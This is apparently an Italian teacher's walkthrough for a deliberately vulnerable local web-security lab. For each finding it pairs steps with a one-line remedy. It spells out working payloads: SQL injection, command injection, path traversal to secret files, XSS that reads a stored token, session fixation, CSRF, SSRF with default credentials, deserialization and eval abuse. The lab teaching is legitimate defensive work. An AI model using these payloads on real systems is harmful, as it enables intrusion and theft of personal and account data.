# Guida allo sfruttamento — materiale per il docente

> **Da non consegnare agli studenti.** Contiene i passaggi operativi di ogni finding.
> Se il repository viene distribuito alla classe, escludi questa cartella (`docs/docente/`) o
> consegna il portale senza di essa.
>
> Tutto gira su `127.0.0.1`. Nulla di quanto segue è applicabile a sistemi reali: l'ente, i
> dati e i servizi non esistono. Non incollare questi input in nessun sistema che non sia
> questo laboratorio.

## Stato del documento

**Bozza di M0.** Le tecniche sono standard e corrette; i **nomi dei parametri, le rotte e le
risposte** sono quelli progettati in `DESIGN.md` e vanno confermati lab per lab quando il
codice esiste (M2–M6). Ogni scheda ha un marcatore:

| Marcatore | Significato |
|---|---|
| `[progetto]` | tecnica definita, stringhe da verificare sul codice |
| `[verificato]` | provato sul portale in esecuzione |

Tutte le schede sono `[verificato]`: ventisei laboratori provati sul laboratorio vero. La
tabella finale tiene il conto.

## Come si legge

Per ogni finding: **prerequisiti** (che account/ruolo serve), **passi**, **input**, **cosa
osservare** (il segnale che dice che il lab è vivo), **se non funziona** (le cause tipiche),
**rimedio da spiegare** (una riga, perché la correzione si spiega a voce).

---

# Capitolo 1 — Ricognizione

## L19 — Esposizione e configurazione `[verificato]`

**Prerequisiti:** nessuno.

**Passi**

1. `GET http://<host>:8081/robots.txt` → elenca `/admin`, `/backup/`, `/debug`, `/sportello/`.
   Non è un controllo di accesso: è un elenco di cose da provare.
2. `GET http://<host>:8081/.git/HEAD` → `ref: refs/heads/main`.
3. Ricostruisci l'albero. Con `git-dumper http://<host>:8081/.git/ ./sorgente`, oppure con
   `python3 docs/docente/strumenti/dump-git.py http://<host>:8081/.git`. Dentro c'è il commit
   del 2 aprile 2025: *«Collaudo di carico: disattiva temporaneamente il rate limit»*.
4. `GET /backup/` → elenco della cartella; `GET /backup/dump-2019.sql` → schema vecchio e hash
   MD5 delle password.
5. `GET /debug` → le ultime query dell'API con i valori interpolati, compresi i codici fiscali
   di chi ha fatto accesso nei minuti precedenti.
6. `GET /debug?sql=SELECT%20*%20FROM%20tabella_inesistente` → pagina di debug del framework con
   stack trace, percorso dei file e variabili d'ambiente. (`/api/pratiche/abc` **non** serve:
   risponde `404` in JSON perché la rotta è vincolata ai numeri.)
7. Preflight con `Origin: http://esempio.invalid` → `Access-Control-Allow-Origin: *`.
8. Apri `http://<host>:8081/debug` dentro un `<iframe>` da un'altra origine → si incastra: non
   c'è `X-Frame-Options`, quindi quella pagina si può coprire con una pagina dell'attaccante.

**Cosa osservare:** il `.git` non è un file finto, è un repository vero: chi lo ricostruisce ha
il sorgente di oggi *e* la storia. Il dump del 2019 ha uno schema diverso da quello attuale
(`password` a 32 caratteri, nessuna tabella `sessioni`): serve a distinguerlo dal database in
esercizio.

**Se non funziona:** verifica che Apache serva i file nascosti. In nginx il blocco è
`location ~ /\.` e qui **non c'è**: è l'errore che stiamo dimostrando. Se `/.git/HEAD` risponde
`404` con `File not found`, l'entrypoint non ha copiato i reperti in `public/`.

**Rimedio da spiegare:** i file di lavoro non stanno nella document root; `robots.txt` non è un
controllo di accesso; una console di debug non si spedisce in produzione nemmeno «per un giorno».
## L21 — Dipendenze obsolete `[verificato]`

**Prerequisiti:** nessuno.

**Passi:** `GET http://<host>:8081/admin/dipendenze` → tabella con pacchetto, versione, stato e
nota.

**Cosa osservare:** cinque voci su dieci sono obsolete, con il CVE e una riga di descrizione.
Nessuna di quelle librerie è realmente installata: la pagina è documentativa. Il contrasto da
mostrare è con `composer.lock`, che L19 ha già consegnato: lì ci sono le versioni vere, e non
coincidono con quelle dichiarate.

**Rimedio da spiegare:** un inventario delle dipendenze che nessuno rigenera è già vecchio il
giorno dopo averlo pubblicato.

**Stato:** provata la pagina il 20 novembre 2026. La pagina non è protetta e non richiede
account.
## L24 — Logging insufficiente `[verificato]`

**Prerequisiti:** nessuno — il registro è pubblico.

**Passi**

1. `GET http://<host>:8081/admin/log` senza alcun token → si leggono gli accessi di tutti.
2. Sbaglia la password dieci volte, poi ricarica il registro: **non cambia niente**. La
   condizione che scarta le risposte `401` è la prima riga del middleware.
3. Inietta una riga: invia una richiesta con
   `User-Agent: Mozilla/5.0 <script>document.write("iniettato")</script>` e ricarica il
   registro. Il testo compare nel database e viene rimandato al browser senza escape.
4. Confronta l'ora di una riga con l'orologio: il registro scrive in UTC senza dirlo, quindi
   d'inverno la riga è un'ora indietro rispetto a Roma, d'estate due.

**Cosa osservare:** il registro sembra completo e non lo è: mancano proprio gli eventi che
direbbero che qualcuno sta provando migliaia di codici fiscali. E chi può scriverci sopra è
chiunque, compreso il browser di chi indaga.

**Rimedio da spiegare:** registrare gli eventi di autenticazione, correlare le richieste,
scrivere in UTC dichiarandolo, separare chi può leggere il registro. Una riga di log non
ripulita non è un problema di log: è una XSS che arriva da un canale che nessuno controlla.
## L22 — Enumerazione, rate limit, sessioni `[verificato]`

**Prerequisiti:** nessuno.

**Passi**

1. **Enumerazione.** `POST /api/login` con un CF inesistente → `{"errore":"Codice fiscale non
   registrato."}`; con un CF esistente e password sbagliata → `{"errore":"Password errata."}`.
2. **Nessun limite.** Ripeti dieci volte: nessuna attesa, nessun `429`. La storia del `.git`
   (L19) spiega perché il limitatore è stato spento.
3. **Sessione fissa.** Apri lo sportello con `curl -b 'PHPSESSID=attaccante123'` e fai accedere
   la vittima: il cookie restituito è **lo stesso** che l'attaccante aveva scelto. Con quel
   valore si leggono le pratiche della vittima.
4. **Uscita che non chiude.** `GET /sportello/esci` mostra «sessione chiusa»; con lo stesso
   cookie le pratiche rispondono ancora.

**Cosa osservare:** tre difetti distinti — messaggio, contatore, ciclo di vita della sessione —
e un quarto che li unisce: l'interfaccia dichiara cose che il server non ha fatto.

**Trappole:** l'enumerazione richiede **due** richieste (esiste / non esiste), altrimenti non si
vede. La sessione fissa richiede due jar di cookie. Il token dell'API non c'entra: qui si parla
del cookie dello sportello.

**Rimedio da spiegare:** messaggio unico, contatore per utente e per IP con blocco progressivo,
`session_regenerate_id()` dopo l'accesso, logout che distrugge sessione e cookie.

**Stato:** provati tutti e quattro i comportamenti il 20 novembre 2026.
## L10 — Iniezione SQL sul login `[verificato]`

**Prerequisiti:** nessuno.

**Passi**

1. `POST http://<host>:8081/api/login` con
   `{"codice_fiscale":"' OR 1=1#","password":"x"}`.
2. La risposta è `200` con un token. Decodificando il payload: `sub: 1`, `ruolo: cittadino`.
3. È Mario Rossi, la prima riga: l'iniezione non sceglie chi essere, restituisce la prima riga
   utile (invariante I1). Per scegliere serve il capitolo 5.

**Cosa osservare:** nessuna sanificazione da aggirare, nessuna concatenazione «quasi giusta»:
la query è stringa, e la password entra come MD5 (L08), quindi il confronto vive nella clausola.

**Trappola:** `--` richiede uno spazio dopo in MySQL; `#` no. Chi parte con `--` perde tempo.

**Rimedio da spiegare:** prepared statement; e la migrazione a bcrypt, che toglie all'attacco la
forza bruta.

**Stato:** provato il 20 novembre 2026.
## L08 — Hash deboli e password riutilizzate `[verificato]`

**Prerequisiti:** nessuno; il dump del 2019 è in L19.

**Passi**

1. `GET http://<host>:8081/debug?sql=SELECT%20codice_fiscale,password%20FROM%20utenti%20WHERE%20id=1`
   → `RSSMRA85M01F205T` con `5f4dcc3b5aa765d61d8327deb882cf99`.
2. Quell'hash è `password`: la ricerca su qualunque dizionario di hash lo dice in un secondo.
3. Prova il login con Mario Rossi e quella password: entra.
4. Confronta con il dump `backup/dump-2019.sql`: schema vecchio, stessa debolezza.

**Cosa osservare:** l'hash non ha sale, quindi due persone con la stessa password hanno lo
stesso valore, e un dizionario precalcolato le apre tutte insieme.

**Trappola:** `Hash::check()` su un MD5 restituisce `false` senza errore: chi riusa il codice di
Laravel crede di aver verificato qualcosa.

**Rimedio da spiegare:** `bcrypt`/`argon2` con costo adeguato, migrazione al primo accesso,
niente hash nei dump.

**Stato:** provato il 20 novembre 2026.
## L09 — Segreti e token `[verificato]`

**Prerequisiti:** nessuno per il primo passo, un account per gli altri.

**Passi**

1. Apri `http://<host>:8080/app.js` e cerca `CHIAVE_BANCA`: è la chiave del servizio bancario,
   non quella che firma i token.
2. DevTools → Application → Local Storage: `token`.
3. Decodifica il payload → `iss`, `sub`, `jti`, `ruolo`, `iat`. **Non c'è `exp`.**
4. `POST /api/logout` con il token → `200`; poi `GET /api/me` con lo stesso token → `200`. Il
   logout non revoca nulla.

**Cosa osservare:** la tabella `sessioni` si riempie a ogni accesso e nessuno la legge. Un
token rubato vale finché non cambia il segreto di firma.

**Trappola:** il portale tratta il `401` come «sessione scaduta», quindi riusare un token
vecchissimo mostra un messaggio fuorviante. Non è il difetto: lo nasconde.

**Rimedio da spiegare:** chiavi fuori dal codice client (la verifica IBAN la fa l'API, non il
browser); token a vita breve con refresh; revoca server-side; `httpOnly` se si torna ai cookie.

**Stato:** provato il 20 novembre 2026.
## L17 — Recupero credenziali prevedibile e OTP debole `[verificato]`

**Prerequisiti:** nessuno.

**Passi**

1. `POST /api/recupera-password` con il CF di Giulia.
2. Apri Mailpit su `http://<host>:8025`: l'email contiene il collegamento
   `http://<host>:8080/#/reimposta?cf=...&token=<CF><AAAAMMGG>`.
3. Il token è il codice fiscale più la data: costruisci quello di **Sara Bianchi**
   (`BNCSRA79C54L219X`) per oggi e chiama `POST /api/reimposta-password`. Non serve che Sara
   abbia mai chiesto il recupero: `reimposta` ricalcola il token invece di leggerlo.
4. Accedi con la password nuova: il token restituito ha `ruolo: funzionario`.
5. Sull'account amministrativo (`MRCLDA65S02H501L`) il recupero risponde `403` e la reimpostazione
   `401`: è l'invariante I5, va mostrata esplicitamente.
6. Per l'OTP: `POST /api/rimborsi/{id}/iban` con un codice sbagliato risponde `401` senza ritardi
   né blocchi; tre tentativi di fila passano senza conseguenze, poi quello giusto risponde `200`.
   Lo spazio è di 10.000 valori e non c'è contatore.

**Cosa osservare:** due difetti diversi nello stesso flusso. Il primo è la prevedibilità del
token (difetto di progetto); il secondo è l'assenza di un contatore sui tentativi (difetto di
esercizio). Il secondo si corregge in un pomeriggio, il primo richiede di ripensare il flusso.

**Trappole:** la password nuova deve avere almeno sei caratteri, altrimenti `422` e sembra un
rifiuto dell'attacco. L'OTP **non** arriva per email: si ricava dall'identificativo
(`id * 7 % 10000`), che è un terzo difetto e un'ottima domanda da fare in aula.

**Rimedio da spiegare:** token casuale da almeno 128 bit, monouso, a scadenza breve, legato
all'utente e conservato (non ricalcolato); OTP a sei cifre con lockout e durata.

**Stato:** provato il 20 novembre 2026, fino all'accesso come funzionario.
## L01 — IDOR in lettura `[verificato]`

**Prerequisiti:** un token qualsiasi; quello di Mario Rossi si ottiene con L08 (`password`) o con
L10 (`' OR 1=1#`).

**Passi**

1. `GET /api/cartelle/1` con il token di Mario → la cartella `2025/000481` di Giulia Neri.
2. `GET /api/pratiche/1` → la pratica `2025/004102`.
3. `GET /api/rimborsi/1` → il rimborso con IBAN.
4. Confronto: `GET /api/cartelle` (senza id) filtra ancora per utente. Il difetto è solo sulle
   rotte puntuali.

**Cosa osservare:** nessun indizio, nessuna credenziale di Giulia: solo un intero incrementale.
Gli id si scorrono a mano cambiando una cifra.

**Trappola:** partendo da un id alto non si trova nulla e sembra che il filtro ci sia.

**Rimedio da spiegare:** l'autorizzazione si fa sull'oggetto (`cartella->codice_fiscale ===
utente->codice_fiscale`), non sulla rotta.

**Stato:** provato il 20 novembre 2026.
## L02 — IDOR in scrittura `[verificato]`

**Prerequisiti:** come L01.

**Passi**

1. `PATCH /api/cartelle/1` con `{"importo":"1.00"}` → la cartella di Giulia vale 1 euro.
2. `PATCH /api/cartelle/1` con `{"codice_fiscale":"RSSMRA85M01F205T"}` → la cartella cambia
   proprietario e Giulia non la vede più.

**Cosa osservare:** la scrittura non dà errore e restituisce l'oggetto aggiornato: chi non
guarda il codice fiscale nella risposta crede di aver toccato la propria cartella.

**Trappola:** `PATCH` con pochi campi sembra innocuo; il `$fillable` di `Cartella` comprende
`codice_fiscale`, quindi il secondo passo funziona.

**Rimedio da spiegare:** come L01 più una lista esplicita dei campi modificabili dal client.

**Stato:** provato il 20 novembre 2026.
## L03 — Forced browsing `[verificato]`

**Prerequisiti:** un token qualsiasi.

**Passi:** `GET /api/admin/export` → CSV con 204 contribuenti (codice fiscale, nome, cognome,
email, ruolo).

**Cosa osservare:** il nome della rotta suggerisce un controllo che non c'è. Il middleware
verifica che tu sia qualcuno, non che tu abbia un ruolo.

**Trappola:** senza token la risposta è `401`, e il laboratorio sembra protetto: è la differenza
fra autenticazione e autorizzazione.

**Rimedio da spiegare:** un controllo di ruolo esplicito sulla rotta, e un export che non
contiene più di quanto serva.

**Stato:** provato il 20 novembre 2026.
## L04 — Path traversal `[verificato]`

**Prerequisiti:** un token; una pratica con un allegato (il seed crea `ricevuta.pdf` sulla
pratica 1).

**Passi**

1. `GET /api/pratiche/1/allegato?file=ricevuta.pdf` → funziona, è l'allegato vero.
2. `GET /api/pratiche/1/allegato?file=../../../../.env` → `APP_KEY`, credenziali del database e
   segreto di firma dei token.
3. Da qui si firma un token da amministratore: è il ponte verso il capitolo 6.

**Cosa osservare:** `is_file()` è l'unico controllo, e verifica che il percorso esista, non che
sia lecito.

**Trappole:** il percorso parte da `storage/app/allegati/{id}/`; con `curl` serve `--path-as-is`,
perché curl normalizza i `..` prima di inviare. Il browser non li normalizza nella query string.

**Rimedio da spiegare:** nome logico e percorso separati, allegati fuori dalla document root,
`basename()` e una lista di file ammessi per pratica.

**Stato:** provato il 20 novembre 2026.
## L05 — Assegnazione di massa `[verificato]`

**Prerequisiti:** un token qualsiasi per il primo vettore; un funzionario per il secondo
(L17 o L22).

**Passi**

1. `PATCH /api/profilo` con `{"codice_fiscale":"NREGLI90A41H501G"}` → il proprio account mostra
   i dati di Giulia.
2. Verifica: `GET /api/cartelle` restituisce le cartelle di Giulia.
3. Secondo vettore (capitolo 6): `PATCH /sportello/utenti/{id}` con `{"ruolo":"amministratore"}`.

**Cosa osservare:** non serve indovinare id o token: si cambia la propria identità. Il `$fillable`
di `Utente` comprende `codice_fiscale`, `ruolo`, `attivo` e `reset_disabilitato`.

**Trappola:** `attivo:false` su sé stessi funziona, e il portale diventa inaccessibile: `lab:reset`.

**Rimedio da spiegare:** `$fillable` come decisione di sicurezza; campi modificabili elencati per
rotta, non per modello.

**Stato:** provato il 20 novembre 2026.
## L06 — CSRF sul cambio IBAN `[verificato]`

**Prerequisiti:** una sessione dello sportello per Giulia (che ha un rimborso) e la pagina-esca.

**Passi**

1. Apri `servizi/esca/csrf.html` (porta 8026) e leggi il form: punta a `POST /sportello/rimborso/1/iban`.
2. Con la sessione attiva, invia: l'IBAN del rimborso diventa quello dell'attaccante.
3. Verifica: `SELECT iban FROM rimborsi WHERE id=1`.

**Cosa osservare:** nessun token, nessun controllo di origine. La richiesta è indistinguibile da
una volontaria.

**Trappola:** con `SameSite=Lax` una POST cross-site non porta il cookie; il laboratorio si regge
sulla pagina-esca servita dalla stessa rete. Se il cookie non arriva, guarda l'header `Cookie`.

**Rimedio da spiegare:** token anti-CSRF legato alla sessione, `SameSite` esplicito, conferma fuori
banda per i dati bancari.

**Stato:** provato il 20 novembre 2026.

## L07 — Reindirizzamento aperto `[verificato]`

**Prerequisiti:** nessuno.

**Passi**

1. `GET http://<host>:8081/sportello/?ritorno=http://esca.example/phishing`.
2. Accedi con Giulia (`NREGLI90A41H501G` / `ciao123`).
3. La risposta è `302` con `Location: http://esca.example/phishing`.

**Cosa osservare:** il dominio nella barra è quello dell'agenzia fino al clic. Il parametro
attraversa il form come campo nascosto, quindi l'attacco si manda per email e regge il sospetto
di chi controlla l'indirizzo.

**Trappola:** `//esempio.example` funziona uguale e i filtri scritti a mano lo sbagliano spesso.

**Rimedio da spiegare:** accettare solo percorsi relativi che iniziano con `/` e non con `//`,
oppure una lista chiusa di destinazioni.

**Stato:** provato il 20 novembre 2026 sullo sportello locale.
## L23 — Deserializzazione insicura `[verificato]`

**Prerequisiti:** un token.

**Passi**

1. `POST /api/profilo/preferenze` con `preferenze` = base64 di
   `a:1:{s:4:"tema";s:5:"scuro";}` → `{"preferenze":{"tema":"scuro"}}`.
2. Ripeti con un oggetto: base64 di `O:8:"stdClass":1:{s:1:"a";s:1:"b";}` → il server istanzia
   l'oggetto che gli hai dato.
3. `POST /api/pratiche/importa` con `{"condizione":"true"}` → importa tutte le pratiche;
   la condizione è PHP valutato con `eval`.

**Cosa osservare:** due difetti dello stesso tipo — input che diventa codice: uno costruisce
oggetti, l'altro li valuta.

**Trappole:** la stringa serializzata ha lunghezze esplicite; un byte sbagliato e
`unserialize` restituisce `false` con un errore che sembra di rete. `eval` restituisce il valore
del `return`: senza `return` non filtra nulla e non dà errore.

**Rimedio da spiegare:** JSON con schema, mai `unserialize` su input esterno; nessun `eval`, e un
filtro espresso con parametri.

**Stato:** provati i tre passi il 20 novembre 2026. L'esecuzione arbitraria via `eval` non è
mostrata nella guida: la decide il docente.
## L26 — Caricamento non sicuro `[verificato]`

**Prerequisiti:** un token; una pratica propria (il seed ne dà una a Giulia).

**Passi**

1. Crea un file `allegato.html` con `<script>alert(document.domain)</script>`.
2. `POST /api/pratiche/{id}/allegato` in multipart, dichiarando `type=text/plain`.
3. La risposta restituisce il nome e l'URL di scaricamento.
4. `GET` di quell'URL → `Content-Type: text/html`, e il browser esegue lo script.

**Cosa osservare:** il controllo esiste ed è quello sbagliato: confronta il tipo **dichiarato**
dal client. Il file viene conservato con il nome originale e servito dal dominio dell'API.

**Trappola:** il file resta anche dopo `lab:reset`, perché `storage/app/allegati` non viene
ripulito: va cancellato a mano.

**Rimedio da spiegare:** nome generato dal server, tipo verificato leggendo il contenuto,
`Content-Disposition: attachment`, dominio separato per i contenuti caricati.

**Stato:** provato il 20 novembre 2026.
## L14 — XSS riflessa `[verificato]`

**Prerequisiti:** nessuno.

**Passi**

1. `GET http://<host>:8081/api/contatti` → il modulo pubblico.
2. `GET http://<host>:8081/api/contatti?nome=prova&messaggio=<script>alert(document.domain)</script>`
   (con l'URL codificato) → la pagina di conferma esegue lo script.

**Cosa osservare:** il modulo accetta `GET`, quindi il payload vive in un collegamento
condivisibile. La conferma è costruita concatenando l'input.

**Trappola:** con `curl` si vede la stringa, non l'esecuzione: serve il browser.

**Rimedio da spiegare:** escape in uscita, `Content-Security-Policy`, e un modulo che accetta
solo `POST`.

**Stato:** provato il 20 novembre 2026.
## L15 — XSS conservata e furto del token `[verificato]`

**Prerequisiti:** un funzionario con pratiche assegnate (Sara Bianchi si ottiene con L17) e il
cittadino proprietario di una di quelle pratiche (dizionario di L08).

**Passi**

1. Come funzionario, `GET /api/sportello/pratiche` → scegli una pratica della sua lista.
2. Come cittadino proprietario, `POST /api/pratiche/{id}/nota` con
   `<img src=x onerror="window.__rubato=localStorage.getItem('adu.token')">`.
3. Apri la SPA come funzionario e vai su `#/sportello`: la nota viene resa con `innerHTML` e
   l'`onerror` esegue.
4. Il token letto è quello del funzionario, e dopo L09 non scade.

**Cosa osservare:** la nota è nel database, quindi non c'è niente da intercettare in transito:
l'attacco vive nel tempo, e colpisce chi apre la pagina dopo.

**Trappole:** `<script>` inserito con `innerHTML` **non** esegue (lo vieta lo standard): serve un
`<img onerror>`. Il funzionario vede solo le proprie pratiche. La pagina legacy
`/sportello/pratica/{id}` è un secondo sink, con la sessione del funzionario.

**Rimedio da spiegare:** mai `innerHTML` su contenuto esterno (`textContent` o sanitizzazione),
CSP, e token non leggibili da JavaScript se si torna ai cookie `httpOnly`.

**Stato:** provato il 20 novembre 2026 con Chromium: la nota esegue e legge `adu.token`.
## L16 — XSS nel DOM `[verificato]`

**Prerequisiti:** nessuno.

**Passi**

1. Apri `http://<host>:8080/?torna=<img src=x onerror=alert(1)>#/accedi`.
2. Lo script esegue nell'origine del portale, senza che l'API riceva nulla.

**Cosa osservare:** il server non vede il payload: nessuna richiesta, nessun log. La funzione di
escape esiste (`testo()`) e qui non è usata.

**Trappole:** senza il frammento `#/accedi` la SPA non instrada. Il payload va codificato
nell'URL. `alert()` può essere bloccato: verifica scrivendo nel DOM.

**Rimedio da spiegare:** `textContent` invece di `innerHTML`, CSP, e consapevolezza che il client
è superficie d'attacco.

**Stato:** provato il 20 novembre 2026 con Playwright.
## L11 — Iniezione SQL con UNION `[verificato]`

**Prerequisiti:** sessione dello sportello (L22 per la fissa, o le credenziali di Giulia).

**Passi**

1. `GET /sportello/pratiche` → le proprie pratiche, cinque colonne visibili, sei nella query.
2. `?cf=' UNION SELECT codice_fiscale,email,password,'2025-01-01',ruolo,1 FROM utenti LIMIT 3#`
   → codici fiscali, email e hash MD5.
3. `?sort=extractvalue(1,concat(0x7e,(SELECT password FROM utenti WHERE id=1)))#` → errore XPATH
   con l'hash dentro.

**Cosa osservare:** l'UNION deve avere sei colonne, e la quarta è una data: i tipi vanno
rispettati. Il numero di colonne si trova con `ORDER BY 1..7`.

**Trappola:** `#` commenta solo fino a fine riga. Qui la query è su una riga sola, quindi
funziona; su query multi-riga serve `/*`.

**Rimedio da spiegare:** prepared statement con `cf` legato, e `sort` scelto da una lista bianca.

**Stato:** provato il 20 novembre 2026.
## L12 — Iniezione SQL cieca e a tempo `[verificato]`

**Prerequisiti:** nessuno (rotta pubblica).

**Passi**

1. `GET /sportello/verifica?protocollo=2025/004102` → «risulta in_lavorazione».
2. `?protocollo=2025/004102' AND '1'='2` → «Nessuna pratica».
3. `?protocollo=2025/004102' AND SLEEP(3)#` → la risposta arriva dopo 3 secondi.
4. Estrazione: `AND SUBSTRING((SELECT password FROM utenti WHERE id=1),1,1)='5'`.

**Cosa osservare:** il canale è il tempo, non il corpo della pagina. La rotta non richiede
sessione: chiunque può interrogarla.

**Trappola importante:** `' OR SLEEP(3)#` cancella il `LIMIT 1` con il commento, quindi `SLEEP`
gira per ogni riga e la richiesta dura mezz'ora. La forma corretta è `AND SLEEP(3)`.

**Rimedio da spiegare:** prepared statement, messaggi d'errore generici, rate limit anche sulle
rotte pubbliche.

**Stato:** provato il 20 novembre 2026 (3,0 s misurati).
## L13 — Iniezione di comandi `[verificato]`

**Prerequisiti:** sessione di un funzionario sullo sportello (L17).

**Passi**

1. `GET /sportello/report?dal=2025-01-01&al=2025-12-31` → il report.
2. `?al=2025-12-31; id` → `uid=33(www-data)` dentro la pagina.

**Cosa osservare:** il comando viene eseguito con `2>&1`, quindi anche gli errori tornano nella
pagina: è il primo posto in cui guardare quando «non funziona».

**Trappola:** con un account cittadino la pagina risponde «riservata al personale»; non è un
guasto, è il controllo di ruolo.

**Rimedio da spiegare:** eliminare `shell_exec` e generare il report in PHP, oppure usare
`escapeshellarg` e un eseguibile che non interpreti altro.

**Stato:** provato il 20 novembre 2026.
## L18 — Race condition sul rimborso `[verificato]`

**Prerequisiti:** token di Giulia; un rimborso in stato `approvato`.

**Passi**

1. `for i in 1 2 3; do curl -X POST .../api/rimborsi/1/richiedi -H "Authorization: Bearer $T" & done; wait`
2. Le tre risposte dicono `"richiesta": 3`: tre richieste di pagamento per un rimborso.

**Cosa osservare:** lettura e scrittura non sono atomiche; l'`usleep` nel controller apre la
finestra perché la corsa si possa vincere a mano.

**Trappola:** in sequenza la seconda risposta è `409`. Serve il parallelismo.

**Rimedio da spiegare:** transazione con `lockForUpdate`, oppure vincolo di unicità su `rimborso_id`.

**Stato:** provato il 20 novembre 2026 (tre richieste da un solo rimborso).

## L06/L05 — Escalation

Il secondo vettore di L05 vive qui: `POST /sportello/utenti/{id}` con `ruolo=amministratore`, da
una sessione funzionario. Provato il 20 novembre 2026: il ruolo di Giulia passa a `amministratore`.

## L25 — SSRF `[verificato]`

**Prerequisiti:** un token qualsiasi.

**Passi**

1. `POST /api/allegati/da-url` con `{"url":"http://mail:8025/api/v1/messages"}` → tutte le email,
   con i collegamenti di recupero password.
2. `{"url":"http://admin:admin@anagrafe/admin"}` → l'anagrafe (L20).
3. `{"url":"http://banca/verifica"}` → «chiave non valida»: il servizio si raggiunge.

**Cosa osservare:** gli host interni si chiamano con il nome del container; `localhost` sarebbe
l'API stessa. L'API diventa il ponte verso la rete che il browser non vede.

**Trappola:** `ignore_errors` fa tornare anche i `4xx`, e un `401` è già una prova di esistenza.

**Rimedio da spiegare:** lista di domini ammessi, nessuno schema `file://`, DNS risolto e
ricontrollato, servizi interni con segreti veri.

**Stato:** provato il 20 novembre 2026.

## L20 — Credenziali predefinite sull'anagrafe `[verificato]`

**Prerequisiti:** L25 per raggiungere il servizio (non ha porte pubblicate).

**Passi**

1. `POST /api/allegati/da-url` con `{"url":"http://anagrafe/admin"}` → `401`.
2. Ripeti con `{"url":"http://admin:admin@anagrafe/admin"}` → `200`, elenco degli endpoint.

**Cosa osservare:** il servizio è protetto, ma da una password che è il nome utente. Il Basic auth
nell'URL attraversa un SSRF che non permette header.

**Rimedio da spiegare:** segreti veri per servizio, nessun pannello di amministrazione su servizi
interni, rate limit.

**Stato:** provato il 20 novembre 2026.

